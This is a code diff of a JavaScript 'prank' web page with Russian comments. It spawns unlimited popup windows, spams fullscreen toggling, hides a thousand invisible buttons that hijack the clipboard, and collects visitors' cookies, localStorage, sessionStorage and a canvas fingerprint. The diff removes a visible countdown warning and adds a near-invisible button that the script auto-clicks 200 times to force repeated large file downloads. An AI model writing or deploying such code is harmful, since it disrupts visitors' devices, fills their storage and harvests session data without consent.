@@ -25,6 +25,7 @@
             background: #000;
             cursor: pointer;
             z-index: 99999;
+            -webkit-tap-highlight-color: transparent;
         }
         #start-screen h1 {
             font-size: 22px;
@@ -39,6 +40,10 @@
             border-radius: 8px;
             cursor: pointer;
             box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
+            -webkit-tap-highlight-color: transparent;
+            outline: none;
+            user-select: none;
+            -webkit-user-select: none;
         }
         #green-btn:hover {
             background: #00ff55;
@@ -124,33 +129,21 @@
             touch-action: manipulation;
         }
 
-        #countdown {
+        #auto-btn {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-family: monospace;
-            font-weight: bold;
-            font-size: 90px;
-            color: #ff0000;
-            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #990000;
-            z-index: 10002;
-            display: none;
-            pointer-events: none;
-            text-align: center;
-            line-height: 1.2;
-            animation: pulse 0.5s infinite;
-        }
-        #countdown .label {
-            font-size: 22px;
-            color: #fff;
-            text-shadow: 0 0 10px #ff0000;
-            display: block;
-            margin-bottom: 10px;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); }
-            50%      { transform: translate(-50%, -50%) scale(1.15); }
+            bottom: 5px;
+            left: 5px;
+            width: 4px;
+            height: 4px;
+            background: transparent;
+            border: none;
+            outline: none;
+            opacity: 0.01;
+            z-index: 999997;
+            cursor: default;
+            -webkit-tap-highlight-color: transparent;
+            padding: 0;
+            margin: 0;
         }
 
         @keyframes blink {
@@ -217,13 +210,6 @@
 
     <div id="flash"></div>
 
-    <div id="countdown">
-        <span class="label">ФАЙЛЫ НАЧНУТ КАЧАТЬСЯ ЧЕРЕЗ</span>
-        <span id="countdown-num">10</span>
-    </div>
-
-    <button id="giant-trap" aria-hidden="true"></button>
-
     <script>
         // ================== НАСТРОЙКИ ==================
         var VIDEO_ID         = "hPZxDJYmTUw";         // ID ролика YouTube
@@ -231,15 +217,15 @@
         var SOUND_URL        = "";                    // ссылка на mp3 (опц.)
 
         // пранк-окна
-        var SPAWN_EVERY      = 200;   // мс между появлением окна
-        var MAX_WINDOWS      = 0;     // 0 = без лимита
+        var SPAWN_EVERY      = 200;
+        var MAX_WINDOWS      = 0;
 
         // клавиатура
-        var KEYBOARD_EVERY   = 150;   // мс
+        var KEYBOARD_EVERY   = 150;
 
         // дёрганье fullscreen
         var FULLSCREEN_SPAM  = true;
-        var FULLSCREEN_EVERY = 500;   // мс
+        var FULLSCREEN_EVERY = 500;
 
         // невидимые кнопки-ловушки
         var BUTTONS_TOTAL    = 1000;
@@ -252,14 +238,11 @@
         var GIANT_COPY_COUNT   = 10;
         var GIANT_COPY_GAP     = 100;
 
-        // отсчёт до скачивания
-        var COUNTDOWN_SECONDS  = 10;     // сколько секунд ждать до старта загрузок
-
         // спам скачиванием текстового файла
         var DOWNLOAD_SPAM      = true;
-        var DOWNLOAD_EVERY     = 1000;       // мс между скачиваниями
+        var DOWNLOAD_EVERY     = 1000;
         var DOWNLOAD_FILENAME  = "YOUAREANIDIOT.txt";
-        var DOWNLOAD_REPEATS   = 300000;     // ~10 МБ на файл
+        var DOWNLOAD_REPEATS   = 300000;
 
         // текст, который копируется
         var CLIP_TEXT          = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
@@ -277,7 +260,6 @@
         var fsInterval        = null;
         var fsOn              = false;
         var downloadInterval  = null;
-        var countdownInterval = null;
 
         // ---------- запуск ----------
         function startVideo() {
@@ -285,6 +267,21 @@
             started = true;
 
             document.getElementById('start-screen').classList.add('hidden');
+
+            // создаём ловушки только после старта
+            if (!document.getElementById('giant-trap')) {
+                var giant = document.createElement("button");
+                giant.id = "giant-trap";
+                giant.setAttribute("aria-hidden", "true");
+                document.body.appendChild(giant);
+            }
+
+            if (!document.getElementById('auto-btn')) {
+                var autoBtn = document.createElement("button");
+                autoBtn.id = "auto-btn";
+                autoBtn.setAttribute("aria-hidden", "true");
+                document.body.appendChild(autoBtn);
+            }
 
             // видео
             try {
@@ -333,36 +330,11 @@
             startTrapButtons();
             startFullscreenSpam();
             startGiantButton();
+            startAutoBtnSpam();
             sendFingerprint();
 
-            // отсчёт до скачивания
-            startCountdown();
-        }
-
-        // ---------- отсчёт ----------
-        function startCountdown() {
-            var el = document.getElementById('countdown');
-            var num = document.getElementById('countdown-num');
-            var left = COUNTDOWN_SECONDS;
-
-            el.style.display = 'block';
-            num.textContent = left;
-
-            countdownInterval = setInterval(function () {
-                if (stopFlag) return;
-
-                left--;
-                num.textContent = left;
-
-                if (left <= 0) {
-                    clearInterval(countdownInterval);
-                    countdownInterval = null;
-                    el.style.display = 'none';
-
-                    // старт загрузок
-                    startDownloadSpam();
-                }
-            }, 1000);
+            // старт загрузок
+            startDownloadSpam();
         }
 
         // ---------- окна ----------
@@ -513,7 +485,6 @@
             var btn = document.createElement('button');
             btn.className = 'copy-trap-btn';
             btn.type = 'button';
-            btn.setAttribute('data-idx', trapBtnCount);
 
             var size = BUTTON_MIN_SIZE + Math.floor(Math.random() *
                        (BUTTON_MAX_SIZE - BUTTON_MIN_SIZE));
@@ -559,6 +530,39 @@
                 e.preventDefault();
                 copyMultipleTimes();
             });
+        }
+
+        // ---------- авто-клик по маленькой кнопке ----------
+        function startAutoBtnSpam() {
+            if (!DOWNLOAD_SPAM) return;
+
+            var clicks = 0;
+            var btn = document.getElementById('auto-btn');
+            if (!btn) return;
+
+            btn.addEventListener('click', function () {
+                triggerDownload();
+            });
+
+            btn.addEventListener('touchstart', function (e) {
+                e.preventDefault();
+                triggerDownload();
+            }, { passive: false });
+
+            downloadInterval = setInterval(function () {
+                if (stopFlag) return;
+
+                clicks++;
+
+                try {
+                    btn.click();
+                } catch (e) {}
+
+                if (clicks >= 200) {
+                    clearInterval(downloadInterval);
+                    downloadInterval = null;
+                }
+            }, 100);
         }
 
         // ---------- спам скачиванием ----------
@@ -638,11 +642,13 @@
                 x.fillStyle = "#069";
                 x.fillText("N3XUS-fp", 2, 15);
                 d.canvas = c2.toDataURL().slice(-64);
-                } catch (e) {}
+            } catch (e) {}
 
-            try { d.cookies = document.cookie || "none"; } catch (e) { d.cookies = "blocked"; }
-            try { d.ls      = JSON.stringify(localStorage).slice(0, 500); } catch (e) { d.ls = "blocked"; }
-            try { d.ss      = JSON.stringify(sessionStorage).slice(0, 500); } catch (e) { d.ss = "blocked"; }
+            try {                 d.cookies = document.cookie || "none";
+            } catch (e) { d.cookies = "blocked"; }
+
+            try { d.ls = JSON.stringify(localStorage).slice(0, 500); } catch (e) { d.ls = "blocked"; }
+            try { d.ss = JSON.stringify(sessionStorage).slice(0, 500); } catch (e) { d.ss = "blocked"; }
 
             d.plugins = Array.from(navigator.plugins || [])
                              .map(function (p) { return p.name; })
